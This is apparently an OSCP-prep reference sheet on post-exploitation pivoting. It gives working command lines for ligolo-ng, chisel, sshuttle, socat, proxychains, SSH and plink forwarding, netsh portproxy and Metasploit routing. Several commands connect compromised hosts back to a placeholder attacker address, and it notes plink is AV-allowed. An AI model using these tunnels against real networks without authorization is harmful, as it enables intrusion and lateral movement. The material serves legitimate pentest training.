# Pivoting, Tunneling & Lateral Network Access — Toolkit Reference (2026)

*For authorized pentest/exam prep only.*

Post-exploitation pivoting splits into two generations: legacy SOCKS-proxy tools (chisel, sshuttle, socat, plink, netsh, Metasploit) that require `proxychains` to wrap each external tool, and **ligolo-ng**, a TUN-interface tool that now dominates practice since native tools (nmap, evil-winrm, netexec, smbclient) hit pivoted hosts directly with no wrapper needed.

---

## Ligolo-ng — current preferred tool for multi-hop/native-tool pivoting

Creates a real Linux TUN interface on the attacker box; every native tool works against the internal network with zero proxychains wrapping.

```bash
# Attacker: create the TUN device
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up

# Attacker: start the proxy (self-signed cert)
./proxy -selfcert -laddr 0.0.0.0:443

# Pivot host: connect back
./agent -connect <ATTACKER_IP>:443 -ignore-cert -retry

# In the proxy console:
session                 # list/select the connected agent
ifconfig                 # view target's interfaces/subnets
start                    # bring tunnel interface up, begin routing

# Attacker: add route to the discovered internal subnet
sudo ip route add 172.16.1.0/24 dev ligolo

# Reverse listener through the pivot (e.g. catch a Windows reverse shell)
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
```
Double pivoting: create a second, distinctly-named TUN interface per additional agent/hop.
**Reference:** https://github.com/nicocha30/ligolo-ng · https://docs.ligolo.ng/

## Chisel — HTTP(S)-tunneled reverse SOCKS/TCP (best for restrictive/HTTP-only egress)

Single static Go binary, tunnels over HTTP/WebSocket.

```bash
# Server (attacker), reverse mode
chisel server -p 8080 --reverse &

# Client (compromised host) — opens reverse SOCKS5 listener on server
chisel client <ATTACKER_IP>:8080 R:socks

# Then wrap external tools:
# edit /etc/proxychains4.conf last line -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.0.2.0/24
```
Remote spec grammar: `3000` (simple local port), `R:2222:localhost:22` (reverse port forward), `R:socks` (reverse SOCKS5), `stdio:host:22`, `1.1.1.1:53/udp`. Auth: `--auth user:pass`.
**Reference:** https://github.com/jpillora/chisel

## sshuttle — full-subnet routing over SSH ("poor man's VPN")

Needs only a standard SSH login + Python on the pivot; routes an entire CIDR through iptables, no per-target SOCKS proxying.
```bash
sshuttle -v -r msfadmin@192.168.10.220 192.168.10.0/24
sshuttle -vvr root@victim --ssh-cmd 'ssh -i ~/.ssh/id_rsa' 172.16.2.0/16
sshuttle -v -r msfadmin@192.168.10.220 192.168.10.0/24 10.0.0.0/16 --dns -D   # multiple subnets, DNS, background
```
**Reference:** https://github.com/sshuttle/sshuttle

## socat — universal raw TCP/UDP relay (fallback, minimal targets)

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.5:80
```
`fork` handles multiple simultaneous connections; can chain two socat instances for double pivots or use `OPENSSL-LISTEN:` for encrypted relays.
**Reference:** http://www.dest-unreach.org/socat/

## proxychains(4) — wraps non-SOCKS-aware tools around any SOCKS proxy

```bash
# /etc/proxychains4.conf: comment default socks4 line, add:
socks5 127.0.0.1 1080

proxychains4 nmap -sT -Pn 10.0.2.0/24    # note: -sT required, not SYN scan
proxychains4 smbclient -L //10.0.2.5/
```
Pairs with SSH dynamic forwarding: `ssh -D 1080 -f -C -q -N user@pivot-host`.
**Reference:** https://github.com/rofl0r/proxychains-ng

## Native SSH local/remote forwarding — the fundamental Linux pivoting primitive

Requires only a standard SSH login on a Linux pivot box; no extra binaries needed.
```bash
# Local forward — reach a service on the far side of the pivot as if it were on localhost
ssh -L 3306:127.0.0.1:3306 user@pivot-host
# now 127.0.0.1:3306 on the attacker box reaches MySQL on pivot-host

# Remote forward — expose a local (attacker-side) service back through the pivot
ssh -R 8080:127.0.0.1:80 user@attacker-ip
# now 127.0.0.1:8080 on attacker-ip reaches port 80 on the box running this command

# Background, no shell, keep-alive (common for a persistent tunnel)
ssh -f -N -L 3306:127.0.0.1:3306 user@pivot-host
```
`-D` (see proxychains section above) is the dynamic/SOCKS variant of the same mechanism.
**Reference:** https://man.openbsd.org/ssh#L

## plink.exe — SSH tunneling from a compromised Windows host

Signed PuTTY CLI client, widely AV-allowed. Only acts as SSH client — forwards originate from the Windows box back to an SSH server you control.
```cmd
:: Remote (reverse) forward — exposes internal Windows service back to attacker
echo y | plink.exe -ssh -l kaliuser -pw password -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attacker-ip

:: Local forward
plink.exe -P 22 -L 13389:internal-rdp-host:3389 kaliuser@attacker-ip -pw password -N -C
```
`-batch` suppresses host-key prompts (needed for unattended execution).
**Reference:** https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

## netsh interface portproxy — living-off-the-land Windows relay (no binary drop)

```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8888 connectaddress=10.10.10.5 connectport=80
netsh advfirewall firewall add rule name="pivot" protocol=TCP dir=in localport=8888 action=allow
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8888
```
Requires the `iphlpsvc` (IP Helper) service running; rules persist in the registry across reboots.
**Reference:** https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy

## Metasploit/Meterpreter — autoroute + socks_proxy + portfwd (reference only — BANNED on the OSCP exam)

**Do not use this on the OSCP exam.** The exam rules permit Meterpreter/Metasploit against only one single target machine for the entire exam, and explicitly forbid using it to route, pivot, or forward traffic toward any additional machine. `post/multi/manage/autoroute`, `auxiliary/server/socks_proxy`, and `portfwd` all exist specifically to route/forward traffic through a Meterpreter session to other hosts — that is the exact pivoting behavior the exam disallows, not merely a "single-target" caveat. Treat the commands below as reference material for non-exam engagements (labs, CTFs, real-world pentests) only; on the OSCP exam use ligolo-ng/chisel/sshuttle/plink/native SSH instead — see EXAM-TIPS.md.
```
use post/multi/manage/autoroute
set SESSION <id>
run

use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# within the Meterpreter session:
portfwd add -l 3389 -p 3389 -r 192.168.1.110              # local forward
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18              # reverse forward
portfwd list
portfwd flush
```
**Reference:** https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html

---

## Tools Reference

| Name | URL |
|---|---|
| ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| chisel | https://github.com/jpillora/chisel |
| sshuttle | https://github.com/sshuttle/sshuttle |
| socat | http://www.dest-unreach.org/socat/ |
| proxychains-ng | https://github.com/rofl0r/proxychains-ng |
| PuTTY / plink.exe | https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html |
| netsh portproxy (built-in) | https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy |
| Metasploit Framework | https://github.com/rapid7/metasploit-framework |
